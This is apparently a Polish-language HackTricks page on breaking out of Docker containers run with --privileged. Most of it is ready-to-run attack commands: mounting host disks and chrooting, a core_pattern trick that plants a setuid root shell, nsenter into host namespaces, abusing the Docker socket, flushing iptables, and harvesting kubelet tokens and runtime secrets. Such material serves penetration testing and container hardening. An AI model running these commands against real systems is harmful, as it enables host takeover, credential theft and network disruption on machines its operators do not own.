# Ucieczka z kontenerów z `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Kontener uruchomiony z `--privileged` to nie to samo co zwykły kontener z jedną lub dwiema dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych mechanizmów ochronnych runtime, które normalnie oddzielają workload od niebezpiecznych zasobów hosta. Dokładny efekt zależy od runtime i hosta, ale dla Docker zwykle oznacza to:

- przyznawane są wszystkie capabilities
- ograniczenia device cgroup zostają zniesione
- wiele systemów plików jądra przestaje być montowanych tylko do odczytu
- domyślnie zmaskowane ścieżki procfs znikają
- filtrowanie seccomp jest wyłączone
- confinement AppArmor jest wyłączony
- izolacja SELinux jest wyłączona albo zastąpiona znacznie szerszą etykietą

Ważnym skutkiem jest to, że kontener z uprawnieniami privileged zazwyczaj **nie** wymaga subtelnego exploit-a jądra. W wielu przypadkach może po prostu bezpośrednio komunikować się z urządzeniami hosta, systemami plików jądra widocznymi dla hosta lub interfejsami runtime i następnie przejść do powłoki hosta.

## Czego `--privileged` automatycznie nie zmienia

`--privileged` **nie** dołącza automatycznie do przestrzeni nazw PID, network, IPC ani UTS hosta. Kontener privileged nadal może mieć prywatne namespaces. To oznacza, że niektóre łańcuchy ucieczki wymagają dodatkowego warunku, takiego jak:

- host bind mount
- udostępnienie host PID
- host networking
- widoczne urządzenia hosta
- zapisywalne interfejsy proc/sys

Te warunki często łatwo spełnić przy rzeczywistych błędach konfiguracyjnych, ale koncepcyjnie są odrębne od samego `--privileged`.

## Ścieżki ucieczki

### 1. Zamontowanie dysku hosta przez wystawione urządzenia

Kontener privileged zwykle widzi znacznie więcej węzłów urządzeń pod `/dev`. Jeśli block device hosta jest widoczne, najprostsza ucieczka to jego zamontowanie i wejście do filesystemu hosta przez `chroot`:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Jeśli root partition nie jest oczywisty, najpierw wyenumeruj układ bloków:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Jeśli praktyczną drogą jest umieszczenie setuid helpera w zapisywalnym mountcie hosta zamiast używać `chroot`, pamiętaj, że nie każdy system plików honoruje bit setuid. Szybkie sprawdzenie możliwości po stronie hosta to:
```bash
mount | grep -v "nosuid"
```
To jest przydatne, ponieważ zapisywalne ścieżki na systemach plików z `nosuid` są znacznie mniej interesujące dla klasycznych scenariuszy "podrzucić setuid shell i uruchomić go później".

Osłabione zabezpieczenia wykorzystywane tutaj to:

- pełna ekspozycja urządzeń
- szerokie capabilities, zwłaszcza `CAP_SYS_ADMIN`

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Zamontowanie lub ponowne użycie host bind mount i `chroot`

Jeśli root filesystem hosta jest już zamontowany wewnątrz kontenera, albo jeśli kontener może utworzyć niezbędne mounty, ponieważ jest privileged, shell hosta często jest tylko jedno `chroot` dalej:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli nie istnieje żaden host root bind mount, ale host storage jest osiągalny, utwórz go:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ta ścieżka wykorzystuje:

- weakened mount restrictions
- full capabilities
- lack of MAC confinement

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Wykorzystanie zapisywalnych `/proc/sys` lub `/sys`

Jednym z głównych skutków `--privileged` jest to, że zabezpieczenia procfs i sysfs stają się dużo słabsze. To może ujawnić interfejsy jądra skierowane na hosta, które normalnie są zamaskowane lub zamontowane jako tylko do odczytu.

Klasycznym przykładem jest `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Inne ścieżki o wysokiej wartości obejmują:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ta ścieżka wykorzystuje:

- brak zamaskowanych ścieżek
- brak systemowych ścieżek ustawionych jako tylko do odczytu

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Użyj pełnych capabilities do ucieczki przez mount lub namespace

Kontener z uprawnieniami otrzymuje capabilities, które zwykle są usuwane w standardowych kontenerach, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i wiele innych. To często wystarcza, by zamienić lokalny punkt zaczepienia w ucieczkę na hosta, gdy tylko pojawi się inne wystawione wejście.

Prosty przykład to zamontowanie dodatkowych systemów plików i użycie wejścia do namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Jeśli PID hosta jest również współdzielony, krok staje się jeszcze krótszy:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ta ścieżka wykorzystuje:

- domyślny privileged capability set
- opcjonalne host PID sharing

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Ucieczka przez Runtime Sockets

Uprzywilejowany container często ma widoczny stan runtime hosta lub sockety. Jeśli socket Docker, containerd, lub CRI-O jest osiągalny, najprostszym podejściem często jest użycie runtime API do uruchomienia drugiego containera z dostępem do hosta:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dla containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ta ścieżka wykorzystuje:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Usuń skutki uboczne izolacji sieciowej

`--privileged` sam w sobie nie dołącza do host network namespace, ale jeśli kontener ma także `--network=host` lub inny host-network access, cały stos sieciowy staje się modyfikowalny:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To nie zawsze prowadzi do bezpośredniej powłoki na hoście, ale może skutkować denial of service, przechwyceniem ruchu lub dostępem do usług zarządzania dostępnych tylko przez loopback.

Powiązane strony:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Odczyt sekretów hosta i stanu runtime

Nawet jeśli natychmiastowe uzyskanie czystej powłoki nie jest możliwe, uprzywilejowane kontenery często mają wystarczający dostęp, by odczytać sekrety hosta, stan kubelet, metadane runtime oraz systemy plików sąsiednich kontenerów:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Jeśli `/var` jest zamontowany z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement lub kradzieży poświadczeń cloud/Kubernetes, nawet zanim zostanie uzyskany host shell.

Powiązane strony:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Sprawdzenia

Celem poniższych poleceń jest potwierdzenie, które privileged-container escape families są natychmiast wykonalne.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Co jest tutaj interesujące:

- pełny zestaw capabilities, zwłaszcza `CAP_SYS_ADMIN`
- udostępniony zapisywalny proc/sys
- widoczne urządzenia hosta
- brak seccomp i ograniczeń MAC
- runtime sockets lub host root bind mounts

Każdy z nich może wystarczyć do post-exploitation. Kilka z nich razem zwykle oznacza, że kontener jest w praktyce o jedno lub dwa polecenia od host compromise.

## Powiązane strony

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
